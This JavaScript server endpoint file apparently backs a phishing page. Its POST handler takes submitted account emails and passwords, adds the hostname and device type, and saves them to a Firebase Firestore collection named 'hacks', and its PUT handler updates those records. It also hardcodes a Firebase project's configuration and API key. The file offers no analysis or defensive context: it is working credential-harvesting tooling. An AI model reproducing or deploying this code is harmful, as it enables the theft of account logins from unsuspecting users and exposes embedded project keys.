import { initializeApp } from 'firebase/app';
import { getFirestore,doc, updateDoc , setDoc } from 'firebase/firestore/lite';

const firebaseConfig = {
    apiKey: "AIzaSyCShwkdDed7LoWgXyuK7mjp98wy8-e-WoU",
    authDomain: "doc-collection-34aa3.firebaseapp.com",
    projectId: "doc-collection-34aa3",
    storageBucket: "doc-collection-34aa3.appspot.com",
    messagingSenderId: "91140673898",
    appId: "1:91140673898:web:1661a1215360b2f0d81513"
  };
  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

export async function post(req) {
   
    var inputData = await req.request.json();
    console.log(inputData);
    var timestamp = new Date().getTime();

    inputData["timestamp"] = timestamp;
    inputData["archived"] = false;
    inputData["hostname"] = 'www.'+req.url.hostname;
    inputData["device"] = getUserDevice(req.request.agent);
    if (
        inputData["input_account_email"].length < 70 &&
        inputData["input_account_password"].length < 70
    ) {
        try {
            let res=await setDoc(doc(db, "hacks", timestamp.toString()), inputData);

          
            console.log('res',res)
            return { body: { message: 'updated', timestamp: timestamp } }
        } catch (error) {
            console.log('post error',error)
            return { body: { message: 'error' ,error:error} }
        }


    }
    console.log(inputData);

}

export async function put(req) {
    
    var inputData = await req.request.json();
    let timestamp = inputData['timestamp']
    delete inputData['timestamp']
    console.log(inputData)



    try {
        let res=await updateDoc(doc(db, "hacks", timestamp), inputData);
        console.log('res', res)
        return { body: { message: 'updated', timestamp: timestamp } }
    } catch (error) {
        console.log(error)
        return { body: { message: 'error' ,error:error} }
    }

}

function getUserDevice(agent) {
    let device = "Other";
    for (key in agent) {
      if (agent["isDesktop"] == true) {
        device = "Desktop";
      }
      if (agent["isMobile"] == true) {
        device = "Mobile";
      }
      if (agent["isTablet"] == true) {
        device = "Tablet";
      }
      if (agent["isiPad"] == true) {
        device = "IPad";
      }
    }
    return device;
  }
